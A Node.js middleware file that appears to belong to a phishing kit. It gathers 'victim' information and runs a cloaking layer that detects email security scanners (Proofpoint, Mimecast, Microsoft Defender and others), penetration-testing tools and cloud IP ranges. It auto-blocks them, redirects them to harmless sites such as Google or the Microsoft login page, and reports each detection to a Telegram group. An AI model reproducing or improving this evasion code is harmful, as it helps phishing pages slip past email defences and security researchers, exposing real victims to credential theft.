// middleware/botDetection.js
const { getFingerprint } = require('../utils/encryption');
const { getVictimInfo } = require('../utils/helpers');
const fs = require('fs');
const path = require('path');

// File paths for persistent storage
const DATA_DIR = './data';
const BLOCKED_IPS_FILE = path.join(DATA_DIR, 'blocked_ips.txt');
const BOT_MESSAGES_FILE = path.join(DATA_DIR, 'bot_messages.json');
const PAGE_ACCESS_MESSAGES_FILE = path.join(DATA_DIR, 'page_access_messages.json');
const BOT_DETECTIONS_LOG = path.join(DATA_DIR, 'bot_detections.log');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Store bot detection message IDs persistently
let botDetectionMessageIds = new Set();
let pageAccessMessageIds = new Set();

// Load bot message IDs from file
function loadBotMessageIds() {
    try {
        if (fs.existsSync(BOT_MESSAGES_FILE)) {
            const content = fs.readFileSync(BOT_MESSAGES_FILE, 'utf8');
            const data = JSON.parse(content);
            botDetectionMessageIds = new Set(data.messageIds || []);
            console.log(`📋 Loaded ${botDetectionMessageIds.size} bot detection message IDs from file`);
        } else {
            fs.writeFileSync(BOT_MESSAGES_FILE, JSON.stringify({ messageIds: [], lastUpdated: new Date().toISOString() }, null, 2));
            console.log('📋 Created new bot messages file');
        }
    } catch(e) {
        console.error('Failed to load bot message IDs:', e.message);
        botDetectionMessageIds = new Set();
    }
}

// Load page access message IDs from file
function loadPageAccessMessageIds() {
    try {
        if (fs.existsSync(PAGE_ACCESS_MESSAGES_FILE)) {
            const content = fs.readFileSync(PAGE_ACCESS_MESSAGES_FILE, 'utf8');
            const data = JSON.parse(content);
            pageAccessMessageIds = new Set(data.messageIds || []);
            console.log(`📋 Loaded ${pageAccessMessageIds.size} page access message IDs from file`);
        } else {
            fs.writeFileSync(PAGE_ACCESS_MESSAGES_FILE, JSON.stringify({ messageIds: [], lastUpdated: new Date().toISOString() }, null, 2));
            console.log('📋 Created new page access messages file');
        }
    } catch(e) {
        console.error('Failed to load page access message IDs:', e.message);
        pageAccessMessageIds = new Set();
    }
}

// Save bot message IDs to file
function saveBotMessageIds() {
    try {
        const data = {
            messageIds: Array.from(botDetectionMessageIds),
            totalCount: botDetectionMessageIds.size,
            lastUpdated: new Date().toISOString()
        };
        fs.writeFileSync(BOT_MESSAGES_FILE, JSON.stringify(data, null, 2));
        console.log(`💾 Saved ${botDetectionMessageIds.size} bot detection message IDs to file`);
    } catch(e) {
        console.error('Failed to save bot message IDs:', e.message);
    }
}

// Save page access message IDs to file
function savePageAccessMessageIds() {
    try {
        const data = {
            messageIds: Array.from(pageAccessMessageIds),
            totalCount: pageAccessMessageIds.size,
            lastUpdated: new Date().toISOString()
        };
        fs.writeFileSync(PAGE_ACCESS_MESSAGES_FILE, JSON.stringify(data, null, 2));
        console.log(`💾 Saved ${pageAccessMessageIds.size} page access message IDs to file`);
    } catch(e) {
        console.error('Failed to save page access message IDs:', e.message);
    }
}

// Add a bot detection message ID to storage
function addBotMessageId(messageId) {
    if (!messageId) return false;
    botDetectionMessageIds.add(messageId);
    
    // Keep only last 500 message IDs to prevent file bloat
    if (botDetectionMessageIds.size > 500) {
        const toDelete = Array.from(botDetectionMessageIds)[0];
        botDetectionMessageIds.delete(toDelete);
    }
    
    saveBotMessageIds();
    return true;
}

// Add a page access message ID to storage
function addPageAccessMessageId(messageId) {
    if (!messageId) return false;
    pageAccessMessageIds.add(messageId);
    
    // Keep only last 500 message IDs to prevent file bloat
    if (pageAccessMessageIds.size > 500) {
        const toDelete = Array.from(pageAccessMessageIds)[0];
        pageAccessMessageIds.delete(toDelete);
    }
    
    savePageAccessMessageIds();
    return true;
}

// Remove a message ID from storage
function removeBotMessageId(messageId) {
    const removed = botDetectionMessageIds.delete(messageId);
    if (removed) saveBotMessageIds();
    return removed;
}

function removePageAccessMessageId(messageId) {
    const removed = pageAccessMessageIds.delete(messageId);
    if (removed) savePageAccessMessageIds();
    return removed;
}

// Get all message IDs
function getAllBotMessageIds() {
    return Array.from(botDetectionMessageIds);
}

function getAllPageAccessMessageIds() {
    return Array.from(pageAccessMessageIds);
}

// Clear all message IDs
function clearAllBotMessageIds() {
    botDetectionMessageIds.clear();
    saveBotMessageIds();
    console.log(`🗑️ Cleared all bot detection message IDs from storage`);
}

function clearAllPageAccessMessageIds() {
    pageAccessMessageIds.clear();
    savePageAccessMessageIds();
    console.log(`🗑️ Cleared all page access message IDs from storage`);
}

// Delete all bot detection messages from Telegram
async function deleteAllBotDetectionMessages(bot, chatId) {
    let deletedCount = 0;
    let failedCount = 0;
    const messageIds = Array.from(botDetectionMessageIds);
    
    console.log(`🗑️ Attempting to delete ${messageIds.length} bot detection messages...`);
    
    for (const messageId of messageIds) {
        try {
            await bot.deleteMessage(chatId, messageId);
            deletedCount++;
            botDetectionMessageIds.delete(messageId);
            await new Promise(resolve => setTimeout(resolve, 100));
        } catch (e) {
            console.log(`Failed to delete message ${messageId}: ${e.message}`);
            failedCount++;
            if (e.message.includes('message can\'t be deleted') || 
                e.message.includes('message not found') ||
                e.message.includes('message to delete not found')) {
                botDetectionMessageIds.delete(messageId);
            }
        }
    }
    
    saveBotMessageIds();
    console.log(`✅ Deleted ${deletedCount} bot detection messages, failed: ${failedCount}`);
    return { deletedCount, failedCount };
}

// Delete all page access messages from Telegram
async function deleteAllPageAccessMessages(bot, chatId) {
    let deletedCount = 0;
    let failedCount = 0;
    const messageIds = Array.from(pageAccessMessageIds);
    
    console.log(`🗑️ Attempting to delete ${messageIds.length} page access messages...`);
    
    for (const messageId of messageIds) {
        try {
            await bot.deleteMessage(chatId, messageId);
            deletedCount++;
            pageAccessMessageIds.delete(messageId);
            await new Promise(resolve => setTimeout(resolve, 100));
        } catch (e) {
            console.log(`Failed to delete message ${messageId}: ${e.message}`);
            failedCount++;
            if (e.message.includes('message can\'t be deleted') || 
                e.message.includes('message not found') ||
                e.message.includes('message to delete not found')) {
                pageAccessMessageIds.delete(messageId);
            }
        }
    }
    
    savePageAccessMessageIds();
    console.log(`✅ Deleted ${deletedCount} page access messages, failed: ${failedCount}`);
    return { deletedCount, failedCount };
}

// Delete ALL messages (both types)
async function deleteAllMessages(bot, chatId) {
    const botResult = await deleteAllBotDetectionMessages(bot, chatId);
    const pageResult = await deleteAllPageAccessMessages(bot, chatId);
    
    return {
        botDeleted: botResult.deletedCount,
        botFailed: botResult.failedCount,
        pageDeleted: pageResult.deletedCount,
        pageFailed: pageResult.failedCount,
        totalDeleted: botResult.deletedCount + pageResult.deletedCount,
        totalFailed: botResult.failedCount + pageResult.failedCount
    };
}

// Expanded bot signatures for better detection
const BOT_SIGNATURES = {
    // Search Engine Bots
    'googlebot': '🔍 Googlebot',
    'bingbot': '🔍 Bingbot',
    'yahoo! slurp': '🔍 Yahoo Slurp',
    'yandexbot': '🔍 Yandex',
    'baiduspider': '🔍 Baidu',
    'duckduckbot': '🔍 DuckDuckGo',
    
    // Social Media Bots
    'facebookexternalhit': '📱 Facebook Crawler',
    'twitterbot': '🐦 Twitterbot',
    'linkedinbot': '💼 LinkedIn Bot',
    'pinterest': '📌 Pinterest Bot',
    'slackbot': '💬 Slack Bot',
    'discordbot': '🎮 Discord Bot',
    'telegrambot': '📱 Telegram Bot',
    
    // SEO & Analytics Bots
    'semrushbot': '📊 Semrush Bot',
    'ahrefsbot': '🔗 Ahrefs Bot',
    'majestic12': '📈 Majestic Bot',
    'rogerbot': '🤖 Rogerbot',
    'dotbot': '⚫ DotBot',
    'blexbot': '🔵 BLEXBot',
    'dataforseobot': '📊 DataForSEO',
    
    // Security Scanners
    'nmap': '🔍 Nmap Scanner',
    'nikto': '⚠️ Nikto Scanner',
    'sqlmap': '💉 SQLMap Scanner',
    'burp': '🔒 Burp Suite',
    'zap': '⚡ OWASP ZAP',
    'nessus': '🛡️ Nessus Scanner',
    'openvas': '🔓 OpenVAS',
    'acunetix': '🔍 Acunetix Scanner',
    'wpscan': '🔍 WPScan',
    
    // Email Security Scanners
    'proofpoint': '📧 Proofpoint Email Security',
    'mimecast': '📧 Mimecast Email Security',
    'barracuda': '📧 Barracuda Email Security',
    'microsoft.atp': '📧 Microsoft ATP/Defender',
    'microsoft-defender': '📧 Microsoft Defender',
    'google.postmaster': '📧 Google Postmaster Tools',
    'trend.micro': '📧 Trend Micro Email Security',
    'sophos': '📧 Sophos Email Security',
    'fortinet': '📧 Fortinet Email Security',
    'cisco.esa': '📧 Cisco Email Security Appliance',
    'mcafee': '📧 McAfee Email Security',
    'symantec': '📧 Symantec Email Security',
    'kaspersky': '📧 Kaspersky Email Security',
    'fsecure': '📧 F-Secure Email Security',
    'checkpoint': '📧 Check Point Email Security',
    'paloalto': '📧 Palo Alto Email Security',
    'forcepoint': '📧 Forcepoint Email Security',
    'zscaler': '📧 Zscaler Email Security',
    'cloudmark': '📧 Cloudmark Email Security',
    'appriver': '📧 AppRiver Email Security',
    'vircom': '📧 Vircom Email Security',
    'agari': '📧 Agari Email Security',
    'valimail': '📧 Valimail Email Security',
    'dmarcian': '📧 Dmarcian DMARC',
    'uriblacklist': '📧 URIBL Blacklist',
    'spamhaus': '📧 Spamhaus',
    'mxtoolbox': '🔧 MXToolbox Scanner',
    'dnsbl': '📧 DNSBL Scanner',
    'rbl': '📧 RBL Scanner',
    
    // HTTP Clients & Scrapers
    'python-requests': '🐍 Python Requests',
    'python-urllib': '🐍 Python Urllib',
    'curl': '🔧 cURL',
    'wget': '📥 Wget',
    'go-http-client': '🐹 Go HTTP Client',
    'axios': '📡 Axios',
    'node-fetch': '🟢 Node Fetch',
    'scrapy': '🕷️ Scrapy',
    'phantomjs': '👻 PhantomJS',
    'selenium': '🤖 Selenium',
    'puppeteer': '🎭 Puppeteer',
    'playwright': '🎬 Playwright',
    'headlesschrome': '👑 Headless Chrome',
    'headlessbrowser': '👻 Headless Browser',
    
    // Generic Bot Patterns
    'bot': '🤖 Generic Bot',
    'crawler': '🕷️ Crawler',
    'spider': '🕸️ Spider',
    'scraper': '🪣 Scraper',
    'scanner': '🔍 Scanner',
    'validator': '✅ Validator',
    'checker': '✔️ Checker',
    'monitor': '📊 Monitor'
};

// Suspicious IP ranges
const SUSPICIOUS_IP_RANGES = [
    '104.131', '159.89', '167.71', '138.197', '45.55',
    '52.0', '54.0', '34.0', '35.0', '18.0', '3.0',
    '20.0', '40.0', '13.0',
    '35.185', '35.186', '35.187',
    '103.21', '103.22', '103.31', '103.244',
    '68.232', '69.64', '72.47',
    '205.201', '207.126', '209.85',
    '192.254', '198.37',
    '40.92', '40.94', '40.126',
    '52.96', '52.97', '52.98',
    '104.47', '104.48',
    '20.190', '20.191',
    '54.240', '54.241',
    '3.208', '3.209',
    '35.223', '35.224',
    '34.120', '34.121'
];

// Redirect URLs
const REDIRECT_URLS = [
    'https://www.google.com',
    'https://www.youtube.com',
    'https://www.nasa.gov',
    'https://login.microsoftonline.com'
];

// Get random redirect URL
function getRandomRedirectUrl() {
    const randomIndex = Math.floor(Math.random() * REDIRECT_URLS.length);
    return REDIRECT_URLS[randomIndex];
}

// Store bot detections globally
let botDetections = [];
let blockedIPs = new Set();

// Load blocked IPs from file on startup
function loadBlockedIPs() {
    try {
        if (fs.existsSync(BLOCKED_IPS_FILE)) {
            const content = fs.readFileSync(BLOCKED_IPS_FILE, 'utf8');
            const ips = content.split('\n').filter(ip => ip.trim().length > 0);
            ips.forEach(ip => blockedIPs.add(ip));
            console.log(`📋 Loaded ${blockedIPs.size} blocked IPs from file`);
        } else {
            fs.writeFileSync(BLOCKED_IPS_FILE, '');
            console.log('📋 Created new blocked IPs file');
        }
    } catch(e) {
        console.error('Failed to load blocked IPs:', e.message);
    }
}

// Save blocked IPs to file
function saveBlockedIPs() {
    try {
        const ips = Array.from(blockedIPs).join('\n');
        fs.writeFileSync(BLOCKED_IPS_FILE, ips);
        console.log(`💾 Saved ${blockedIPs.size} blocked IPs to file`);
    } catch(e) {
        console.error('Failed to save blocked IPs:', e.message);
    }
}

// Function to block an IP
function blockIP(ip, reason = 'Manual block') {
    if (!ip || ip === 'unknown' || ip === '::1' || ip === '127.0.0.1') {
        console.log(`⚠️ Skipping blocking of local/unknown IP: ${ip}`);
        return false;
    }
    
    if (blockedIPs.has(ip)) {
        console.log(`ℹ️ IP already blocked: ${ip}`);
        return false;
    }
    
    blockedIPs.add(ip);
    saveBlockedIPs();
    console.log(`🔴 IP BLOCKED AUTOMATICALLY: ${ip} (Reason: ${reason})`);
    return true;
}

// Function to unblock an IP
function unblockIP(ip) {
    if (!ip) return false;
    const removed = blockedIPs.delete(ip);
    if (removed) saveBlockedIPs();
    console.log(`🟢 IP UNBLOCKED: ${ip}`);
    return removed;
}

// Function to get all blocked IPs as formatted string
function getFormattedBlockedIPs() {
    const ips = Array.from(blockedIPs);
    if (ips.length === 0) return '📋 *No IPs currently blocked.*\n━━━━━━━━━━━━━━━━━━\nAll systems are clear.';
    
    let formatted = `📋 *BLOCKED IPS (${ips.length})*\n━━━━━━━━━━━━━━━━━━\n`;
    ips.forEach((ip, index) => {
        formatted += `${index + 1}. \`${ip}\`\n`;
    });
    formatted += `━━━━━━━━━━━━━━━━━━\nUse the buttons below to manage blocked IPs.`;
    return formatted;
}

// Function to get bot type
function getBotType(userAgent) {
    const uaLower = userAgent.toLowerCase();
    
    for (const [signature, type] of Object.entries(BOT_SIGNATURES)) {
        if (uaLower.includes(signature)) {
            return type;
        }
    }
    
    const chromeMatch = userAgent.match(/Chrome\/(\d+)/i);
    const firefoxMatch = userAgent.match(/Firefox\/(\d+)/i);
    
    if (chromeMatch && parseInt(chromeMatch[1]) < 70) {
        return '⚠️ Old Chrome Browser';
    }
    if (firefoxMatch && parseInt(firefoxMatch[1]) < 60) {
        return '⚠️ Old Firefox Browser';
    }
    
    return '🤖 Unknown Bot';
}

// Send Telegram notification for bot detection
async function sendBotNotification(bot, telegramGroupId, botInfo, autoBlocked = true) {
    if (!bot || !telegramGroupId) return;
    
    const autoBlockedText = autoBlocked ? '✅ AUTO-BLOCKED & REDIRECTED' : '⚠️ Detection only';
    
    const message = 
        `🤖 *BOT DETECTED & REDIRECTED!*\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `*Type:* ${botInfo.type}\n` +
        `*IP:* \`${botInfo.ip}\`\n` +
        `*Location:* ${botInfo.location}\n` +
        `*Path:* ${botInfo.path}\n` +
        `*User Agent:* \`${botInfo.userAgent.substring(0, 100)}...\`\n` +
        `*Time:* ${new Date().toLocaleString()}\n` +
        `*Status:* ${autoBlockedText}\n` +
        `*Redirected to:* Random legitimate site\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `⚠️ This IP has been automatically blocked and redirected.`;
    
    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [{ text: '🔴 UNBLOCK THIS IP', callback_data: `unblock_ip|${botInfo.ip}` }],
                [{ text: '📋 VIEW BLOCKED IPS', callback_data: `view_blocked_ips` }],
                [{ text: '🗑️ DELETE ALL BOT MSGS', callback_data: `delete_all_bot_messages` }],
                [{ text: '🗑️ DELETE ALL ACCESS MSGS', callback_data: `delete_all_access_messages` }],
                [{ text: '🗑️ DELETE ALL MESSAGES', callback_data: `delete_all_messages` }]
            ]
        }
    };
    
    try {
        const sentMessage = await bot.sendMessage(telegramGroupId, message, options);
        if (sentMessage && sentMessage.message_id) {
            addBotMessageId(sentMessage.message_id);
        }
        console.log(`✅ Bot notification sent for IP: ${botInfo.ip}`);
    } catch (e) {
        console.error('Telegram error:', e.message);
    }
}

// Function to redirect bot requests
function redirectBot(res) {
    const redirectUrl = getRandomRedirectUrl();
    console.log(`🔄 Redirecting bot to: ${redirectUrl}`);
    return res.redirect(redirectUrl);
}

// Function to automatically block, log, and redirect bot
async function handleBotDetection(req, res, bot, groupId, botType, reason) {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || '';
    const victimInfo = await getVictimInfo(req);
    
    const detection = {
        type: botType,
        ip: ip,
        path: req.path,
        userAgent: userAgent,
        location: victimInfo.location,
        timestamp: new Date().toISOString(),
        blocked: true,
        autoBlocked: true,
        reason: reason,
        redirected: true
    };
    
    botDetections.unshift(detection);
    if (botDetections.length > 100) botDetections.pop();
    
    const logEntry = `${new Date().toISOString()} | ${botType} | ${ip} | ${req.path} | ${userAgent.substring(0, 200)}\n`;
    fs.appendFileSync(BOT_DETECTIONS_LOG, logEntry);
    
    const blocked = blockIP(ip, `Bot detected: ${botType}`);
    
    if (bot && groupId) {
        await sendBotNotification(bot, groupId, {
            type: botType,
            ip: ip,
            location: victimInfo.location,
            path: req.path,
            userAgent: userAgent
        }, blocked);
    }
    
    return redirectBot(res);
}

function browserOnlyMiddleware(req, res, next) {
    const userAgent = req.headers['user-agent'] || '';
    
    const botPatterns = [
        'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget',
        'python', 'java', 'perl', 'ruby', 'php', 'go-http-client',
        'headless', 'phantom', 'selenium', 'puppeteer', 'playwright',
        'axios', 'node-fetch', 'postman', 'insomnia',
        'facebookexternalhit', 'twitterbot', 'linkedinbot',
        'slackbot', 'discordbot', 'telegrambot',
        'WordPress', 'Wget', 'Lynx', 'Links', 'w3m'
    ];
    
    const isBot = botPatterns.some(pattern => 
        userAgent.toLowerCase().includes(pattern.toLowerCase())
    );
    
    const hasBrowserIndicators = 
        userAgent.includes('Mozilla') || 
        userAgent.includes('Chrome') || 
        userAgent.includes('Safari') || 
        userAgent.includes('Firefox') || 
        userAgent.includes('Edge') || 
        userAgent.includes('Opera');
    
    if (isBot || !hasBrowserIndicators) {
        console.log(`🚫 Blocked non-browser request: ${userAgent.substring(0, 100)}`);
        return redirectBot(res);
    }
    
    next();
}

function unifiedBotDetection(verifiedSessions) {
  return async function(req, res, next) {
        // WHITELIST: Skip bot detection for subdomain API routes
        const whitelistedPaths = [
            '/api/create-subdomain',
            '/api/subdomain-stats', 
            '/api/subdomain-cleanup',
            '/api/block-subdomain',
            
        ];
        
        if (whitelistedPaths.includes(req.path)) {
            console.log(`🔓 Whitelisted path - skipping bot detection: ${req.method} ${req.path}`);
            return next();
        }
        
        // Also check for API key (optional, keep if you want)
        const apiKey = req.headers['x-api-key'];
        const INTERNAL_API_KEY = process.env.INTERNAL_API_KEY;
        
        if (apiKey && apiKey === INTERNAL_API_KEY) {
            console.log(`🔓 Valid API key - skipping bot detection for ${req.method} ${req.path}`);
            return next();
        }
        const userAgent = req.headers['user-agent'] || '';
        const uaLower = userAgent.toLowerCase();
        const fingerprint = getFingerprint(req);
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
        
        const groupId = process.env.TELEGRAM_GROUP_ID;
        const bot = req.app.locals?.bot;
        
        if (blockedIPs.has(ip)) {
            console.log(`🚫 Blocked IP attempted access: ${ip} - Redirecting`);
            return redirectBot(res);
        }
        
        const verified = verifiedSessions.get(fingerprint);
        if (verified && Date.now() - verified.timestamp < 3600000) {
            console.log(`✅ Previously verified fingerprint: ${fingerprint.substring(0, 20)}...`);
            return next();
        }
        
        const obviousBots = [
            'proofpoint', 'mimecast', 'barracuda', 'microsoft.atp', 'microsoft-defender',
            'google.postmaster', 'trend.micro', 'sophos', 'fortinet', 'cisco.esa',
            'mcafee', 'symantec', 'kaspersky', 'fsecure', 'checkpoint', 'paloalto',
            'forcepoint', 'zscaler', 'spamhaus', 'dnsbl', 'rbl', 'mxtoolbox',
            'valimail', 'agari', 'cloudmark',
            'python-requests', 'curl', 'wget', 'postman', 'axios',
            'go-http-client', 'scrapy', 'phantomjs', 'selenium',
            'headlesschrome', 'headlessbrowser', 'puppeteer', 'playwright',
            'sqlmap', 'nikto', 'nmap', 'burp', 'zap', 'acunetix', 'wpscan'
        ];
        
        for (const botSignature of obviousBots) {
            if (uaLower.includes(botSignature)) {
                console.log(`🚫 Blocked obvious bot: ${botSignature} from IP: ${ip}`);
                await handleBotDetection(req, res, bot, groupId, getBotType(userAgent), `Obvious bot: ${botSignature}`);
                return;
            }
        }
        
        for (const header in req.headers) {
            const headerLower = header.toLowerCase();
            if (headerLower.includes('proofpoint') || 
                headerLower.includes('mimecast') ||
                headerLower.includes('barracuda') ||
                headerLower.includes('cisco') ||
                headerLower.includes('fortinet') ||
                headerLower.includes('trendmicro') ||
                headerLower.includes('sophos')) {
                console.log(`🚫 Email scanner detected via header: ${header} from IP: ${ip}`);
                await handleBotDetection(req, res, bot, groupId, '📧 Email Security Scanner', `Header: ${header}`);
                return;
            }
        }
        
        for (const [signature, botType] of Object.entries(BOT_SIGNATURES)) {
            if (uaLower.includes(signature)) {
                console.log(`🚫 Blocked bot: ${signature} from IP: ${ip}`);
                await handleBotDetection(req, res, bot, groupId, botType, `Bot pattern: ${signature}`);
                return;
            }
        }
        
        for (const ipRange of SUSPICIOUS_IP_RANGES) {
            if (ip.startsWith(ipRange)) {
                console.log(`⚠️ Suspicious IP range detected: ${ip}`);
                await handleBotDetection(req, res, bot, groupId, '🌐 Suspicious IP Range', `IP range: ${ipRange}`);
                return;
            }
        }
        
        if (userAgent.includes('compatible;') && userAgent.includes('http://')) {
            console.log(`🚫 Blocked bot with URL pattern from IP: ${ip}`);
            await handleBotDetection(req, res, bot, groupId, '🚫 Suspicious URL Pattern', 'URL pattern detected');
            return;
        }
        
        const chromeMatch = userAgent.match(/Chrome\/(\d+)/i);
        const firefoxMatch = userAgent.match(/Firefox\/(\d+)/i);
        const safariMatch = userAgent.match(/Safari\/(\d+)/i) && !chromeMatch;
        const edgeMatch = userAgent.match(/Edg\/(\d+)/i);
        const operaMatch = userAgent.match(/OPR\/(\d+)/i);
        
        let isValidBrowser = false;
        
        if (chromeMatch) {
            const version = parseInt(chromeMatch[1]);
            if (version >= 70 && version <= 150) isValidBrowser = true;
        } else if (firefoxMatch) {
            const version = parseInt(firefoxMatch[1]);
            if (version >= 60 && version <= 150) isValidBrowser = true;
        } else if (edgeMatch) {
            const version = parseInt(edgeMatch[1]);
            if (version >= 80 && version <= 150) isValidBrowser = true;
        } else if (operaMatch) {
            const version = parseInt(operaMatch[1]);
            if (version >= 60 && version <= 150) isValidBrowser = true;
        } else if (safariMatch) {
            const versionMatch = userAgent.match(/Version\/(\d+)/i);
            if (versionMatch && parseInt(versionMatch[1]) >= 12) isValidBrowser = true;
            else if (userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('Mac')) {
                isValidBrowser = true;
            }
        }
        
        if (!isValidBrowser) {
            console.log(`🚫 Blocked invalid browser from IP: ${ip}: ${userAgent.substring(0, 100)}`);
            await handleBotDetection(req, res, bot, groupId, '🚫 Invalid Browser', 'Invalid browser version');
            return;
        }
        
        verifiedSessions.set(fingerprint, {
            timestamp: Date.now(),
            userAgent: userAgent,
            ip: ip
        });
        
        console.log(`✅ Valid browser allowed: ${userAgent.substring(0, 100)}`);
        return next();
    };
}

function getBotDetections() {
    return botDetections;
}

function getBlockedIPs() {
    return Array.from(blockedIPs);
}

// Initialize on load
loadBlockedIPs();
loadBotMessageIds();
loadPageAccessMessageIds();

module.exports = { 
    browserOnlyMiddleware, 
    unifiedBotDetection,
    blockIP,
    unblockIP,
    getBotDetections,
    getBlockedIPs,
    getFormattedBlockedIPs,
    addBotMessageId,
    addPageAccessMessageId,
    removeBotMessageId,
    removePageAccessMessageId,
    getAllBotMessageIds,
    getAllPageAccessMessageIds,
    clearAllBotMessageIds,
    clearAllPageAccessMessageIds,
    deleteAllBotDetectionMessages,
    deleteAllPageAccessMessages,
    deleteAllMessages,
    BOT_SIGNATURES,
    handleBotDetection,
    redirectBot,
    getRandomRedirectUrl,
    REDIRECT_URLS
};